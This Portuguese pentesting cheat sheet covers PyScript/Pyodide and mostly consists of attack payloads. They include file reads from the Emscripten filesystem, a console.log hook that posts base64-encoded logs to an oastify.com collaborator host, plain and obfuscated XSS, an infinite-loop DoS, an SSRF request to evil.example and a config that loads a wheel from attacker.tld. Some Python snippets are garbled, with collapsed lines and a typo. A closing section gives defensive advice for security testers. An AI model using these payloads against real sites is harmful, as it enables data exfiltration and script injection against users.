# Pyscript

## Guia de Pentesting do PyScript

PyScript é um novo framework desenvolvido para integrar Python ao HTML, permitindo seu uso junto com HTML. Nesta cheat sheet, você encontrará como usar PyScript para fins de pentesting.

### Extraindo / Recuperando arquivos do sistema de arquivos de memória virtual do Emscripten:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Resultado:

![Guia de Pentesting do PyScript - Dumping / Recuperando arquivos do Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration do Emscripten virtual memory filesystem (monitoramento do console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Resultado:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Código:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Resultado:

![Exfiltração de dados OOB do sistema de arquivos de memória virtual do Emscripten (monitoramento do console) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Código:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Resultado:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Código:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Resultado:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): Ataque DoS (loop infinito)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### Ataque DoS (loop infinito)

Código:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Resultado:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Novas vulnerabilidades e técnicas (2023-2025)

### Server-Side Request Forgery via redirecionamentos não controlados (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignora os parâmetros de requisição `redirect` e `retries` quando usado com o browser transport do Pyodide. Se um atacante puder influenciar as URLs de destino, o código poderá seguir redirecionamentos entre domínios mesmo quando for solicitado ao urllib3 que os desative, enfraquecendo as defesas contra SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Atualize para `urllib3 >= 2.5.0` no Node.js, mas não dependa do urllib3 para desabilitar redirecionamentos em browsers; valide ou use uma allow-list de destinos antes de fazer requisições.<sup>[[4]](#references)</sup>

### Carregamento arbitrário de pacotes e ataques à cadeia de suprimentos

A configuração do Pyodide do PyScript aceita URLs arbitrárias de wheels em `packages`; se um atacante puder modificar ou injetar essa configuração, uma importação subsequente poderá executar Python controlado pelo atacante no browser da vítima.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide pode instalar wheels pure-Python a partir de URLs arbitrárias sem um build WebAssembly do pacote.<sup>[[6]](#references)</sup> Mantenha esta configuração sob controle do desenvolvedor, permita apenas nomes exatos de pacotes ou URLs em uma allow-list e verifique os digests dos wheels remotos durante o build ou a implantação.

### Alterações na sanitização da saída (2023+)

* Na implementação 2022.05.1 usada pelos exemplos legados, `print()` escreve a saída `text/plain` sem escape de HTML e, portanto, é vulnerável a XSS.<sup>[[8]](#references)</sup>
* O helper atual `display()` **faz escape de HTML por padrão** para strings simples; markup bruto deve ser encapsulado em `pyscript.HTML()`.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Use `display()` para entradas não confiáveis e não passe strings não confiáveis para `HTML()`.<sup>[[2]](#references)</sup>

---

## Melhores práticas defensivas

* **Mantenha os pacotes atualizados** – use `urllib3 >= 2.5.0` em Node.js e analise separadamente as suposições sobre redirecionamentos do navegador.<sup>[[4]](#references)</sup>
* **Restrinja as fontes de pacotes** – permita apenas nomes do PyPI ou URLs exatas e confiáveis, e verifique os digests de wheels remotas durante o build ou a implantação.<sup>[[5]](#references)[[6]](#references)</sup>
* **Reforce a Content Security Policy** – proíba JavaScript inline (`script-src 'self' 'sha256-…'`) para que blocos `<script>` injetados não possam ser executados.
* **Proíba tags `<py-script>` / `<script type="py">` fornecidas pelo usuário** – sanitize o HTML no servidor antes de devolvê-lo a outros usuários.
* **Isole os workers** – se você não precisar de acesso síncrono ao DOM a partir dos workers, habilite a flag `sync_main_only` para evitar `SharedArrayBuffer` e os requisitos associados de cabeçalhos CORS.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Documentação de built-ins do PyScript – `display` e `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - A arte do encadeamento de vulnerabilidades (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Aviso de segurança do urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Documentação de configuração do PyScript – packages e `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Carregando pacotes](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Implementação de `pyscript.py` do PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
